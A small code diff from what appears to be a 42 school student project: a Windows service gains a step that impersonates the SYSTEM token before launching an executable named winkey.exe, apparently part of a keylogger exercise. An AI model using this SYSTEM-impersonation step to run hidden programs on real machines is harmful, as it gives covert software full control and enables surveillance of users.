@@ -6,7 +6,7 @@
 /*   By: vzurera- <vzurera-@student.42malaga.com    +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2025/05/11 13:31:13 by vzurera-          #+#    #+#             */
-/*   Updated: 2025/05/12 20:58:33 by vzurera-         ###   ########.fr       */
+/*   Updated: 2025/05/13 13:11:37 by vzurera-         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -116,6 +116,12 @@
 
 			// Reportar estado de "Corriendo"
 			ReportStatusToSCMgr(SERVICE_RUNNING, NO_ERROR, 0);
+
+		    // Impersonificar el token SYSTEM
+			if (!ImpersonateSystemToken()) {
+				ReportStatusToSCMgr(SERVICE_STOPPED, GetLastError(), 0);
+				return;
+			}
 
 			// Ruta al ejecutable winkey.exe en system32
 			const char* targetExe = "C:\\Windows\\winkey.exe";
